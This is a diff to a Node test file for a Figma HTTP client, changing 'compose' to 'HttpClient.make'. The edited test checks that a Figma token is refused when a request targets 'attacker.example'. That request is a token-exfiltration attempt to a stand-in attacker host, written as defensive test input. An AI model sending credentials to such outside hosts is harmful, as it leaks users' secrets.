@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { describe, it, type TestContext } from "node:test";
-import { compose } from "@zemd/http-client";
+import { HttpClient } from "@zemd/http-client";
 
 import { figma } from "./api.ts";
 import { figmaToken } from "./utils.ts";
@@ -33,7 +33,7 @@ void describe("Figma client request boundaries", () => {
   void it("refuses to forward a Figma token to another origin", async (context) => {
     const mockFetch = fetchMock(context);
     await assert.rejects(
-      compose([figmaToken("FIGMA_CANARY")], mockFetch)("https://attacker.example/resource"),
+      HttpClient.make([figmaToken("FIGMA_CANARY")], mockFetch)("https://attacker.example/resource"),
       /Refusing to send a Figma token/,
     );
     assert.strictEqual(mockFetch.mock.callCount(), 0);
